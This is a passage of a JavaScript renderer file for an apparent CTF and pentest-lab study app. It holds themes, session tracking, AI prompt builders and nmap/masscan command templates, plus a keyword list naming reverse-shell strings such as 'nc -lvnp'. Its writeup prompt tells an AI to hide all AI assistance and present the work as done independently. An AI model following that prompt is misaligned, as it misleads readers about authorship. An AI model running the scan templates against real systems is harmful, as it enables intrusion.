// renderer-part1.js — CYBERLAB COMPANION renderer (Part 1 of 4)
// Covers: embedded module logic, app state, init, splash, wizard, themes
// NOTE: contextIsolation=true, nodeIntegration=false — no require() allowed
//       All IPC via window.electronAPI  |  CDN globals: hljs, Chart
'use strict';

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1A — THEMES  (from themes.js — adapted for browser)
// ═══════════════════════════════════════════════════════════════════════════════

const THEMES = {
  cyberpunk: {
    id: 'cyberpunk', name: 'Cyberpunk', dot: '#b44fff',
    vars: {
      '--bg':'#0d0d1a','--bg-secondary':'#13132b','--bg2':'#090912','--bg3':'#131324','--bg4':'#1a1a2e',
      '--panel':'#13132b','--panel-alt':'#181830',
      '--border':'#2a2a4a','--border2':'#2a1f4a','--input-bg':'#1a1a35','--input-border':'#3a3a6a',
      '--accent':'#b44fff','--accent-2':'#00ffe0','--accent-dim':'rgba(180,79,255,0.12)',
      '--accent-glow':'rgba(180,79,255,0.35)','--accent-2-glow':'rgba(0,255,224,0.25)',
      '--text':'#e8e8ff','--text-dim':'#8888bb','--text-muted':'#5555aa',
      '--btn-border':'#b44fff','--btn-text':'#b44fff','--btn-glow':'rgba(180,79,255,0.4)',
      '--btn-hover-bg':'rgba(180,79,255,0.15)','--code-bg':'#0a0a15',
      '--sidebar-bg':'#090912','--card-bg':'#111122',
      '--chat-user-bg':'rgba(180,79,255,0.18)','--chat-ai-bg':'#13132b',
      '--chat-ai-border':'#b44fff','--scrollbar':'#1e1535',
      '--progress-start':'#b44fff','--progress-end':'#00ffe0',
      '--chart-1':'#b44fff','--chart-2':'#00ffe0','--node-glow':'#b44fff',
      '--danger':'#ff4466','--error':'#ff4466','--success':'#00ffe0','--warning':'#ffcc00',
      '--font-family':'"JetBrains Mono","Fira Code",Consolas,monospace','--bg-texture':'1',
    }
  },
  terminal: {
    id: 'terminal', name: 'Terminal', dot: '#00ff41',
    vars: {
      '--bg':'#0a0a0a','--bg-secondary':'#0f0f0f','--bg2':'#050505','--bg3':'#111111','--bg4':'#1a1a1a',
      '--panel':'#0f0f0f','--panel-alt':'#121212',
      '--border':'#1a3a1a','--border2':'#1a3d1a','--input-bg':'#0a0a0a','--input-border':'#00ff41',
      '--accent':'#00ff41','--accent-2':'#39ff14','--accent-dim':'rgba(0,255,65,0.1)',
      '--accent-glow':'rgba(0,255,65,0.3)','--accent-2-glow':'rgba(0,204,51,0.2)',
      '--text':'#00ff41','--text-dim':'#00bb30','--text-muted':'#2d7a2d',
      '--btn-border':'#00ff41','--btn-text':'#00ff41','--btn-glow':'rgba(0,255,65,0.35)',
      '--btn-hover-bg':'rgba(0,255,65,0.12)','--code-bg':'#050505',
      '--sidebar-bg':'#050505','--card-bg':'#0d0d0d',
      '--chat-user-bg':'rgba(0,255,65,0.12)','--chat-ai-bg':'#0f0f0f',
      '--chat-ai-border':'#00ff41','--scrollbar':'#0f2d0f',
      '--progress-start':'#00ff41','--progress-end':'#39ff14',
      '--chart-1':'#00ff41','--chart-2':'#00cc33','--node-glow':'#00ff41',
      '--danger':'#ff3322','--error':'#ff3300','--success':'#00ff41','--warning':'#ffff00',
      '--font-family':'"JetBrains Mono","Fira Code",Consolas,monospace','--bg-texture':'0',
    }
  },
  stealth: {
    id: 'stealth', name: 'Stealth', dot: '#4a9eff',
    vars: {
      '--bg':'#0e1117','--bg-secondary':'#161b22','--bg2':'#0d1017','--bg3':'#181e2a','--bg4':'#1e2535',
      '--panel':'#161b22','--panel-alt':'#1c2128',
      '--border':'#30363d','--border2':'#252d3d','--input-bg':'#131926','--input-border':'#21262d',
      '--accent':'#4a9eff','--accent-2':'#7bb8ff','--accent-dim':'rgba(74,158,255,0.12)',
      '--accent-glow':'rgba(74,158,255,0.3)','--accent-2-glow':'rgba(123,184,255,0.2)',
      '--text':'#c9d1d9','--text-dim':'#8b949e','--text-muted':'#8b949e',
      '--btn-border':'#4a9eff','--btn-text':'#4a9eff','--btn-glow':'rgba(74,158,255,0.3)',
      '--btn-hover-bg':'rgba(74,158,255,0.1)','--code-bg':'#0d1017',
      '--sidebar-bg':'#0d1017','--card-bg':'#141a24',
      '--chat-user-bg':'rgba(74,158,255,0.12)','--chat-ai-bg':'#161b22',
      '--chat-ai-border':'#4a9eff','--scrollbar':'#30363d',
      '--progress-start':'#4a9eff','--progress-end':'#7bb8ff',
      '--chart-1':'#4a9eff','--chart-2':'#7bb8ff','--node-glow':'#4a9eff',
      '--danger':'#f85149','--error':'#ff4a6e','--success':'#3ddc84','--warning':'#ffb347',
      '--font-family':'-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,sans-serif','--bg-texture':'0',
    }
  },
  graphite: {
    id: 'graphite', name: 'Graphite', dot: '#6ea8fe',
    vars: {
      '--bg':'#111318','--bg-secondary':'#1a1f27','--bg2':'#0d1017','--bg3':'#181e2a','--bg4':'#1e2535',
      '--panel':'#1a1f27','--panel-alt':'#1a2130',
      '--border':'#2a313d','--border2':'#252d3d','--input-bg':'#131926','--input-border':'#21262d',
      '--accent':'#6ea8fe','--accent-2':'#9ec5fe','--accent-dim':'rgba(110,168,254,0.12)',
      '--accent-glow':'rgba(110,168,254,0.3)','--accent-2-glow':'rgba(158,197,254,0.2)',
      '--text':'#d8dee9','--text-dim':'#8b949e','--text-muted':'#8b949e',
      '--btn-border':'#6ea8fe','--btn-text':'#6ea8fe','--btn-glow':'rgba(110,168,254,0.3)',
      '--btn-hover-bg':'rgba(110,168,254,0.1)','--code-bg':'#0d1017',
      '--sidebar-bg':'#0d1017','--card-bg':'#141a24',
      '--chat-user-bg':'rgba(110,168,254,0.12)','--chat-ai-bg':'#1a1f27',
      '--chat-ai-border':'#6ea8fe','--scrollbar':'#2a313d',
      '--progress-start':'#6ea8fe','--progress-end':'#9ec5fe',
      '--chart-1':'#6ea8fe','--chart-2':'#9ec5fe','--node-glow':'#6ea8fe',
      '--danger':'#f85149','--error':'#ff4a6e','--success':'#3ddc84','--warning':'#ffb347',
      '--font-family':'-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,sans-serif','--bg-texture':'0',
    }
  },
  oled: {
    id: 'oled', name: 'OLED', dot: '#4a9eff',
    vars: {
      '--bg':'#000000','--bg-secondary':'#0b0b0b','--bg2':'#050505','--bg3':'#111111','--bg4':'#1a1a1a',
      '--panel':'#0b0b0b','--panel-alt':'#121212',
      '--border':'#1a1a1a','--border2':'#252525','--input-bg':'#0a0a0a','--input-border':'#1a1a1a',
      '--accent':'#4a9eff','--accent-2':'#7bb8ff','--accent-dim':'rgba(74,158,255,0.12)',
      '--accent-glow':'rgba(74,158,255,0.3)','--accent-2-glow':'rgba(123,184,255,0.2)',
      '--text':'#f5f5f5','--text-dim':'#888888','--text-muted':'#888888',
      '--btn-border':'#4a9eff','--btn-text':'#4a9eff','--btn-glow':'rgba(74,158,255,0.3)',
      '--btn-hover-bg':'rgba(74,158,255,0.1)','--code-bg':'#050505',
      '--sidebar-bg':'#050505','--card-bg':'#0b0b0b',
      '--chat-user-bg':'rgba(74,158,255,0.12)','--chat-ai-bg':'#0b0b0b',
      '--chat-ai-border':'#4a9eff','--scrollbar':'#1a1a1a',
      '--progress-start':'#4a9eff','--progress-end':'#7bb8ff',
      '--chart-1':'#4a9eff','--chart-2':'#7bb8ff','--node-glow':'#4a9eff',
      '--danger':'#f85149','--error':'#ff4a6e','--success':'#3ddc84','--warning':'#ffb347',
      '--font-family':'-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,sans-serif','--bg-texture':'0',
    }
  },
  threat: {
    id: 'threat', name: 'Threat', dot: '#cc0000',
    vars: {
      '--bg':'#0a0000','--bg-secondary':'#110000','--bg2':'#060000','--bg3':'#120000','--bg4':'#1a0505',
      '--panel':'#110000','--panel-alt':'#160000',
      '--border':'#1f0a0a','--border2':'#2d1010','--input-bg':'#150000','--input-border':'#cc0000',
      '--accent':'#cc0000','--accent-2':'#ff2a2a','--accent-dim':'rgba(204,0,0,0.12)',
      '--accent-glow':'rgba(204,0,0,0.4)','--accent-2-glow':'rgba(255,42,42,0.25)',
      '--text':'#f0e0e0','--text-dim':'#aa8888','--text-muted':'#7a4040',
      '--btn-border':'#cc0000','--btn-text':'#cc0000','--btn-glow':'rgba(204,0,0,0.4)',
      '--btn-hover-bg':'rgba(204,0,0,0.15)','--code-bg':'#0f0000',
      '--sidebar-bg':'#060000','--card-bg':'#110505',
      '--chat-user-bg':'rgba(204,0,0,0.18)','--chat-ai-bg':'#110000',
      '--chat-ai-border':'#cc0000','--scrollbar':'#1f0a0a',
      '--progress-start':'#cc0000','--progress-end':'#ff2a2a',
      '--chart-1':'#cc0000','--chart-2':'#ff2a2a','--node-glow':'#cc0000',
      '--danger':'#ff4444','--error':'#ff2a2a','--success':'#44cc44','--warning':'#ff8c00',
      '--font-family':'-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,sans-serif','--bg-texture':'0',
    }
  }
};

const DIFFICULTY_COLORS = { Easy:'#3fb950', Medium:'#d29922', Hard:'#f85149', Insane:'#a371f7' };

const HIGHLIGHT_THEMES = {
  cyberpunk:'atom-one-dark', terminal:'base16/green-screen',
  stealth:'github-dark', threat:'base16/tomorrow-night'
};

function applyTheme(themeId, animate = true) {
  const theme = THEMES[themeId];
  if (!theme) return;
  const root = document.documentElement;
  if (animate) root.style.transition = 'background-color 0.3s,color 0.3s';
  // Set CSS variables inline (highest priority — overrides any stylesheet)
  Object.entries(theme.vars).forEach(([k,v]) => root.style.setProperty(k, v));
  // Set data-theme attribute for [data-theme] CSS selectors
  root.dataset.theme = themeId;
  // Body class for legacy theme-specific rules
  Object.keys(THEMES).forEach(id => document.body.classList.remove(`theme-${id}`));
  document.body.classList.add(`theme-${themeId}`);
  document.body.classList.toggle('bg-texture', theme.vars['--bg-texture'] === '1');
  document.body.classList.toggle('bg-vignette', themeId === 'threat');
  document.body.classList.toggle('theme-cursor-blink', themeId === 'terminal');
  // Update highlight.js theme link
  let link = document.getElementById('hljs-theme');
  if (link) link.href = `https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/${HIGHLIGHT_THEMES[themeId] || 'github-dark'}.min.css`;
  // Update theme select
  const themeSel = document.getElementById('theme-select');
  if (themeSel) themeSel.value = themeId;
  // Update legacy theme dropdown indicator
  const dot = document.getElementById('theme-dot');
  const nameEl = document.getElementById('theme-name');
  if (dot) dot.style.background = theme.dot;
  if (nameEl) nameEl.textContent = theme.name;
  if (animate) setTimeout(() => root.style.transition = '', 350);
}

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1B — SOUNDS  (from sounds.js — browser AudioContext)
// ═══════════════════════════════════════════════════════════════════════════════

let _audioCtx = null;
let _soundsEnabled = false;
let _masterVolume = 0.5;

function _getCtx() {
  if (!_audioCtx) _audioCtx = new (window.AudioContext || window.webkitAudioContext)();
  return _audioCtx;
}

function _playTone(opts) {
  if (!_soundsEnabled) return;
  try {
    const ctx = _getCtx();
    const { frequency=440, type='sine', duration=0.2, volume=0.3, attack=0.01,
            decay=0.1, sustain=0.5, release=0.1, detune=0, delay=0 } = opts;
    const t0 = ctx.currentTime + delay;
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain); gain.connect(ctx.destination);
    osc.type = type; osc.frequency.setValueAtTime(frequency, t0);
    if (detune) osc.detune.setValueAtTime(detune, t0);
    const vol = volume * _masterVolume;
    gain.gain.setValueAtTime(0, t0);
    gain.gain.linearRampToValueAtTime(vol, t0 + attack);
    gain.gain.linearRampToValueAtTime(vol * sustain, t0 + attack + decay);
    gain.gain.setValueAtTime(vol * sustain, t0 + duration - release);
    gain.gain.linearRampToValueAtTime(0, t0 + duration);
    osc.start(t0); osc.stop(t0 + duration);
  } catch(e) {}
}

const Sounds = {
  init(cfg={}) { _soundsEnabled = !!cfg.soundsEnabled; _masterVolume = (cfg.volume||50)/100; },
  setEnabled(v) { _soundsEnabled = !!v; },
  setVolume(v) { _masterVolume = Math.max(0, Math.min(1, v/100)); },
  finding() { _playTone({frequency:880,type:'sine',duration:0.1,volume:0.25,attack:0.005,decay:0.05,sustain:0.3,release:0.04}); },
  flag() {
    _playTone({frequency:523,type:'triangle',duration:0.15,volume:0.3,attack:0.01,decay:0.05,sustain:0.6,release:0.08});
    _playTone({frequency:659,type:'triangle',duration:0.15,volume:0.3,attack:0.01,delay:0.1,decay:0.05,sustain:0.6,release:0.08});
    _playTone({frequency:784,type:'triangle',duration:0.15,volume:0.35,attack:0.01,delay:0.2,decay:0.05,sustain:0.6,release:0.1});
  },
  achievement() {
    [392,523,659,784].forEach((f,i) => _playTone({frequency:f,type:'triangle',duration:i===3?0.25:0.12,volume:i===3?0.4:0.3,attack:0.01,delay:i*0.1,decay:0.04,sustain:0.5,release:0.06}));
  },
  sessionComplete() {
    _playTone({frequency:440,type:'sine',duration:0.12,volume:0.3,attack:0.01,decay:0.06,sustain:0.4,release:0.05});
    _playTone({frequency:550,type:'sine',duration:0.12,volume:0.3,attack:0.01,delay:0.12,decay:0.06,sustain:0.4,release:0.05});
    _playTone({frequency:660,type:'sine',duration:0.2,volume:0.35,attack:0.01,delay:0.24,decay:0.08,sustain:0.5,release:0.1});
  },
  apiError() {
    _playTone({frequency:330,type:'sawtooth',duration:0.1,volume:0.2,attack:0.005,decay:0.04,sustain:0.3,release:0.05});
    _playTone({frequency:277,type:'sawtooth',duration:0.1,volume:0.2,attack:0.005,delay:0.1,decay:0.04,sustain:0.3,release:0.05});
  },
  timerExpiry() {
    _playTone({frequency:880,type:'square',duration:0.25,volume:0.25,attack:0.005,decay:0.08,sustain:0.5,release:0.1});
    _playTone({frequency:660,type:'square',duration:0.25,volume:0.25,attack:0.005,delay:0.3,decay:0.08,sustain:0.5,release:0.1});
  },
  focusToggle() {
    for (let i=0;i<8;i++) _playTone({frequency:200+(i*60),type:'sine',duration:0.08,volume:0.12,attack:0.005,delay:i*0.018,decay:0.02,sustain:0.3,release:0.05});
  },
  themeSwitch() { _playTone({frequency:660,type:'sine',duration:0.04,volume:0.12,attack:0.002,decay:0.01,sustain:0.2,release:0.02}); },
  click() { _playTone({frequency:660,type:'sine',duration:0.04,volume:0.12,attack:0.002,decay:0.01,sustain:0.2,release:0.02}); },
};

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1C — SESSION LOGIC  (from session.js)
// ═══════════════════════════════════════════════════════════════════════════════

const FINDING_TYPES = ['PORT','CRED','CVE','FLAG','FILE','SERVICE','USER','HASH'];
const FLAG_PATTERNS = [
  /HTB\{[^}]+\}/g, /THM\{[^}]+\}/g, /FLAG\{[^}]+\}/g,
  /picoCTF\{[^}]+\}/g, /ctf\{[^}]+\}/gi,
  /[a-zA-Z0-9_-]+\{[a-zA-Z0-9_\-+/=!@#$%^&*.,?]+\}/g,
];
const METHODOLOGY_PHASES     = ['Reconnaissance','Enumeration','Exploitation','Post-Exploitation','Privilege Escalation','Lateral Movement','Flag Capture'];
const METHODOLOGY_PHASES_OSINT = ['Passive Recon','Active Recon','Username/Identity Enumeration','Metadata Analysis','Domain/Infrastructure Intel','Social Engineering Analysis','Reporting'];

function createSession(opts={}) {
  return {
    id: Date.now().toString(36) + Math.random().toString(36).slice(2),
    name: opts.name || opts.labName || 'New Session',
    labName: opts.name || opts.labName || 'New Session',
    platform: opts.platform || 'HTB',
    difficulty: opts.difficulty || 'Medium',
    labType: opts.labType || 'HTB/THM Linux',
    isOsint: opts.labType === 'OSINT/CTF',
    startTime: Date.now(),
    endTime: null,
    durationMinutes: 0,
    target: { ip: opts.ip || opts.targetIp || '', hostname: opts.hostname || '', os: opts.targetOs || 'Unknown', notes:'' },
    targetIp: opts.targetIp || opts.ip || '',
    targetHostname: opts.hostname || '',
    targetOs: opts.targetOs || '',
    notesList: [],
    findings: { ports:[], users:[], credentials:[], flags:[], cves:[], files:[], hashes:[], services:[], notes:'' },
    methodology: {
      phases: opts.labType === 'OSINT/CTF' ? [...METHODOLOGY_PHASES_OSINT] : [...METHODOLOGY_PHASES],
      completed: [],
      activePhase: null,
    },
    hintLevel: 1,
    teachMeMode: false,
    usedTeachMe: false,
    chat: [],
    toolsUsed: [],
    commandsCopied: [],
    terminalOutputs: [],
    timer: { enabled: !!(opts.timerEnabled), totalSeconds: (opts.timerMins||120)*60, elapsed:0, running:false, overtime:false },
    examMode: !!(opts.timerEnabled),
    complete: false,
    mistakes: { repeatedCommands:{}, skippedSteps:[], hintEscalations:{}, methodologyBreaks:[] },
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };
}

function sessionAddFinding(session, type, value) {
  const entry = { id: Date.now().toString(36)+Math.random().toString(36).slice(2), value, addedAt: new Date().toISOString() };
  switch(type) {
    case 'PORT':    if(!session.findings.ports.find(f=>f.value===value))       { session.findings.ports.push(entry); return entry; } break;
    case 'USER':    if(!session.findings.users.find(f=>f.value===value))       { session.findings.users.push(entry); return entry; } break;
    case 'CRED':    if(!session.findings.credentials.find(f=>f.value===value)) { session.findings.credentials.push(entry); return entry; } break;
    case 'FLAG':    if(!session.findings.flags.find(f=>f.value===value))       { const e2={...entry,validated:/^[a-zA-Z0-9_-]+\{[^}]+\}$/.test(value)}; session.findings.flags.push(e2); return e2; } break;
    case 'CVE':     if(!session.findings.cves.find(f=>f.value===value))        { session.findings.cves.push(entry); return entry; } break;
    case 'FILE':    if(!session.findings.files.find(f=>f.value===value))       { session.findings.files.push(entry); return entry; } break;
    case 'HASH':    if(!session.findings.hashes.find(f=>f.value===value))      { session.findings.hashes.push(entry); return entry; } break;
    case 'SERVICE': if(!session.findings.services.find(f=>f.value===value))    { session.findings.services.push(entry); return entry; } break;
  }
  return null;
}

function sessionRemoveFinding(session, type, id) {
  const map = {PORT:'ports',USER:'users',CRED:'credentials',FLAG:'flags',CVE:'cves',FILE:'files',HASH:'hashes',SERVICE:'services'};
  const key = map[type];
  if(!key) return;
  session.findings[key] = session.findings[key].filter(f => f.id !== id);
}

function parseFindings(text, session) {
  const found = [];
  const pattern = /\[FINDING:(\w+)\]\s*([^\n\[]+)/gi;
  let m;
  while((m = pattern.exec(text)) !== null) {
    const type = m[1].toUpperCase();
    const value = m[2].trim();
    if(!FINDING_TYPES.includes(type)) continue;
    const e = sessionAddFinding(session, type, value);
    if(e) found.push({type, value, entry:e});
  }
  FLAG_PATTERNS.forEach(re => {
    const flags = text.match(re);
    if(flags) flags.forEach(f => {
      if(!session.findings.flags.find(x=>x.value===f)) {
        const e = sessionAddFinding(session, 'FLAG', f);
        if(e) found.push({type:'FLAG', value:f, entry:e});
      }
    });
  });
  return found;
}

function buildWriteupSystemPrompt() {
  return `You are a technical writer producing a cybersecurity lab writeup for ItsEliias. Using only the successful findings, commands, and methodology phases from the session state provided, write a clean technical writeup in neutral voice.

Rules:
- Write only what succeeded — omit all failed attempts and hints received
- Never reference any AI, assistant, or hint system
- Write as if ItsEliias worked through this methodically and independently
- Infer logical thought process between steps for narrative coherence
- Every command in a fenced code block with correct language tag (bash, powershell, python, etc.)
- Include actual output snippets where session data contains them
- Be technical and precise — this is a reference document
- Write sections in exactly the order specified in the prompt
- Neutral voice throughout: "nmap revealed...", "directory enumeration uncovered...", "the service was vulnerable to..."

Writeup sections order:
1. YAML Frontmatter (title, date, platform, difficulty, author: ItsEliias, tags, completed: true, ip, time_to_complete)
2. Overview (2-3 sentences: box type, OS, key vulnerability theme)
3. Reconnaissance (initial scans, exact commands, what was found)
4. Enumeration (deeper service enumeration, key discoveries)
5. Exploitation (vulnerability, exact exploit, how initial access gained)
6. Post-Exploitation / Privilege Escalation (how root/admin achieved)
7. Flags (user flag and root flag, values and paths)
8. If I Did This Again (2-3 sentences on efficiency improvements)
9. Lessons Learned (3-5 bullet points of key technical takeaways)

For CTF labs use: Overview, Challenge Description, Solution, Flag, Techniques Used, Lessons Learned
For Cisco/Networking: Overview, Topology, Configuration Steps, Verification Commands, Lessons Learned
For Web App labs: Overview, Reconnaissance, Vulnerability Discovery, Exploitation, Impact, Remediation Notes, Lessons Learned`;
}

function buildWriteupContext(session) {
  const flags   = session.findings.flags.map(f=>f.value).join(', ') || 'Not captured';
  const cmds    = session.commandsCopied.map(c=>c.command).join('\n');
  const elapsed = Math.floor((Date.now() - session.startTime)/1000);
  const h = Math.floor(elapsed/3600), m = Math.floor((elapsed%3600)/60);
  const dur = h>0 ? `${h}h ${m}m` : `${m}m`;
  const findings = JSON.stringify({
    ports:    session.findings.ports.map(p=>p.value),
    users:    session.findings.users.map(u=>u.value),
    credentials: session.findings.credentials.map(c=>c.value),
    cves:     session.findings.cves.map(c=>c.value),
    flags:    session.findings.flags.map(f=>f.value),
    services: session.findings.services.map(s=>s.value),
    files:    session.findings.files.map(f=>f.value),
  }, null, 2);
  const chatCtx = session.chat.filter(m=>m.role==='assistant')
    .map(m=>`[AI]: ${(m.content||'').slice(0,400)}`).join('\n\n');
  return {
    labName: session.labName,
    platform: session.platform,
    difficulty: session.difficulty,
    labType: session.labType,
    targetIP: session.target.ip,
    targetOS: session.target.os,
    duration: dur,
    completionDate: new Date().toISOString().slice(0,10),
    methodologyCompleted: session.methodology.completed.join(', '),
    flags, findings, commands: cmds, chatContext: chatCtx,
  };
}

function getMistakePatterns(session) {
  const patterns = [];
  Object.entries(session.mistakes.repeatedCommands||{}).forEach(([cmd,count]) => {
    if(count>1) patterns.push(`Ran same command ${count}× : "${cmd.slice(0,60)}"`);
  });
  Object.entries(session.mistakes.hintEscalations||{}).forEach(([topic,count]) => {
    if(count>=2) patterns.push(`Hint escalated ${count}× on: ${topic}`);
  });
  (session.mistakes.methodologyBreaks||[]).forEach(b => {
    patterns.push(`Completed "${b.phase}" after already completing: ${b.laterPhases.join(', ')}`);
  });
  const checkRobots = (session.commandsCopied||[]).some(c=>c.command.includes('robots.txt'));
  const hasWebEnum  = (session.commandsCopied||[]).some(c=>['gobuster','ffuf','feroxbuster','dirb','nikto'].some(t=>c.command.includes(t)));
  if(hasWebEnum && !checkRobots) patterns.push('Web enumeration done but robots.txt not explicitly checked');
  return patterns;
}

function inferTechniques(session) {
  const t = new Set();
  const text = (session.chat||[]).map(m=>m.content||'').join(' ').toLowerCase();
  const kws = {
    'SQL Injection':['sqlmap','sql injection','union select'],
    'XSS':['xss','cross-site script'],
    'LFI/RFI':['lfi','rfi','local file inclusion'],
    'SSRF':['ssrf','server-side request'],
    'Privilege Escalation':['linpeas','winpeas','privesc','privilege escalation','suid','sudo -l'],
    'Active Directory':['bloodhound','kerberoast','impacket','crackmapexec','active directory'],
    'Hash Cracking':['hashcat','john the ripper','hash crack'],
    'Reverse Shell':['reverse shell','revshell','/bin/bash','nc -lvnp'],
    'Port Scanning':['nmap','masscan','rustscan'],
    'Web Enumeration':['gobuster','ffuf','feroxbuster','dirb'],
    'SMB':['smbclient','enum4linux','smb'],
    'Buffer Overflow':['buffer overflow','bof'],
  };
  Object.entries(kws).forEach(([tech,arr]) => { if(arr.some(k=>text.includes(k))) t.add(tech); });
  return Array.from(t);
}

function serializeSession(session) {
  return { ...session, toolsUsed: Array.isArray(session.toolsUsed)?session.toolsUsed:[], updatedAt: new Date().toISOString() };
}

function deserializeSession(data) {
  const s = { ...data };
  if(!Array.isArray(s.toolsUsed)) s.toolsUsed = [];
  return s;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1D — AI SYSTEM PROMPT BUILDER
// ═══════════════════════════════════════════════════════════════════════════════

function buildSystemPrompt(session) {
  const hintNames = ['','Nudge — one sentence, zero tool or technique names',
    'Hint — general category of technique only',
    'Guidance — name tool/technique, explain why, no exact command',
    'Walkthrough — full steps, exact commands, expected output',
    'Full Solution — every command in order, full explanation'];

  const findings = session ? JSON.stringify({
    ports: session.findings.ports.map(p=>p.value),
    users: session.findings.users.map(u=>u.value),
    credentials: session.findings.credentials.map(c=>c.value),
    flags: session.findings.flags.map(f=>f.value),
    cves: session.findings.cves.map(c=>c.value),
    services: session.findings.services.map(s=>s.value),
    files: session.findings.files.map(f=>f.value),
  }, null, 2) : '{}';

  const methodInfo = session ? `Phases: ${session.methodology.phases.join(' → ')}\nCompleted: ${session.methodology.completed.join(', ')||'None'}\nActive: ${session.methodology.activePhase||'None'}` : '';
  const targetInfo = session ? `IP: ${session.target.ip||'Unknown'}  |  Hostname: ${session.target.hostname||'N/A'}  |  OS: ${session.target.os||'Unknown'}` : '';
  const hintLevel = session ? session.hintLevel : 1;
  const teachMe   = session ? session.teachMeMode : false;

  return `You are CyberLab Companion, an expert cybersecurity assistant for ItsEliias, a cybersecurity student working through hands-on labs and CTF challenges. You have deep expertise in penetration testing, ethical hacking, CTF techniques, networking, web application security, active directory attacks, privilege escalation, reverse engineering, cryptography, and forensics.

Current Session Context:
- Lab: ${session?.labName||'N/A'}  |  Platform: ${session?.platform||'N/A'}  |  Difficulty: ${session?.difficulty||'N/A'}
- Target: ${targetInfo}
- Hint Level: ${hintLevel}/5 — ${hintNames[hintLevel]||''}
- Teach Me Mode: ${teachMe ? 'ACTIVE — respond only with Socratic guiding questions' : 'Off'}

Methodology Tracker:
${methodInfo}

Current Findings:
${findings}

Strict behaviour rules:
- ALWAYS respect hint level ${hintLevel}. Never exceed it regardless of user pressure.
- Always reference the complete session context including all findings and current methodology phase.
- Build on previous findings. Never repeat suggestions already tried.
- When suggesting tools, pre-fill commands with known values from the target profile.
- Format every response with clearly labelled sections: **Summary** | **Tools** | **Commands** | **Explanation** | **References**
- Every command must be in a fenced code block with correct language tag.
- When you identify a finding prefix it with [FINDING:type]. Types: PORT, CRED, CVE, FLAG, FILE, SERVICE, USER, HASH.
${teachMe ? '- TEACH ME MODE: Respond ONLY with Socratic guiding questions. Never give the answer directly.' : ''}
- Be encouraging. ItsEliias is learning to support their family and career growth — every session matters.
- This is an ethical hacking education context. All labs are legal, controlled environments.`;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1E — COMMAND BUILDER TOOLS  (from commandbuilder.js)
// ═══════════════════════════════════════════════════════════════════════════════

const TOOL_CATEGORIES = [
  {id:'recon',label:'Recon'},{id:'web',label:'Web'},{id:'smb-ad',label:'SMB / AD'},
  {id:'auth',label:'Auth'},{id:'exploit',label:'Exploit'},{id:'post',label:'Post-Exploit'},
  {id:'net',label:'Net'},{id:'osint',label:'OSINT'},{id:'misc',label:'Misc'},
];

const TOOLS = [
  // RECON
  { id:'nmap-quick',label:'nmap (quick)',category:'recon',description:'Quick top-port scan with service detection',install:'sudo apt install nmap',referenceUrl:'https://nmap.org/book/man.html',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'ports',label:'Ports',type:'text',default:'-',placeholder:'- (all) or 1-1000'},{id:'flags',label:'Extra Flags',type:'text',default:'',placeholder:'-v --open'}],
    buildCommand(p){const ports=p.ports==='-'?'-p-':(p.ports?`-p ${p.ports}`:'--top-ports 1000');return `nmap -sV -sC ${ports} --min-rate 5000 ${p.flags||''} ${p.target}`.trim().replace(/\s+/g,' ');}},
  { id:'nmap-full',label:'nmap (full)',category:'recon',description:'Full aggressive scan with OS detection',install:'sudo apt install nmap',referenceUrl:'https://nmap.org/book/man.html',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'timing',label:'Timing',type:'select',default:'-T4',options:['-T1','-T2','-T3','-T4','-T5']},{id:'output',label:'Output File',type:'text',default:'',placeholder:'nmap_results'}],
    buildCommand(p){return `sudo nmap -A ${p.timing||'-T4'} -p- ${p.output?`-oA ${p.output}`:''} ${p.target}`.trim().replace(/\s+/g,' ');}},
  { id:'nmap-udp',label:'nmap (UDP)',category:'recon',description:'UDP scan of top ports',install:'sudo apt install nmap',referenceUrl:'https://nmap.org/book/man.html',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'top',label:'Top N Ports',type:'text',default:'100',placeholder:'100'}],
    buildCommand(p){return `sudo nmap -sU --top-ports ${p.top||100} -sV ${p.target}`;}},
  { id:'nmap-script',label:'nmap (script)',category:'recon',description:'Run specific NSE scripts',install:'sudo apt install nmap',referenceUrl:'https://nmap.org/nsedoc/',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'port',label:'Port',type:'text',default:'',placeholder:'445'},{id:'script',label:'Script',type:'text',default:'vuln',placeholder:'smb-vuln-ms17-010'}],
    buildCommand(p){return `nmap ${p.port?`-p ${p.port}`:''} --script=${p.script||'vuln'} ${p.target}`.trim();}},
  { id:'masscan',label:'masscan',category:'recon',description:'Ultra-fast port scanner',install:'sudo apt install masscan',referenceUrl:'https://github.com/robertdavidgraham/masscan',
    params:[{id:'target',label:'Target IP/Range',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'ports',label:'Ports',type:'text',default:'1-65535',placeholder:'1-65535'},{id:'rate',label:'Rate (pps)',type:'text',default:'1000',placeholder:'1000'}],
    buildCommand(p){return `sudo masscan -p${p.ports||'1-65535'} ${p.target} --rate=${p.rate||1000} -e tun0`;}},
  { id:'rustscan',label:'rustscan',category:'recon',description:'Fast port scanner that feeds into nmap',install:'cargo install rustscan',referenceUrl:'https://github.com/RustScan/RustScan',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'batch',label:'Batch Size',type:'text',default:'5000',placeholder:'5000'}],
    buildCommand(p){return `rustscan -a ${p.target} -b ${p.batch||5000} -- -sV -sC`;}},
  // WEB
  { id:'gobuster-dir',label:'gobuster (dir)',category:'web',description:'Directory/file bruteforce',install:'sudo apt install gobuster',referenceUrl:'https://github.com/OJ/gobuster',
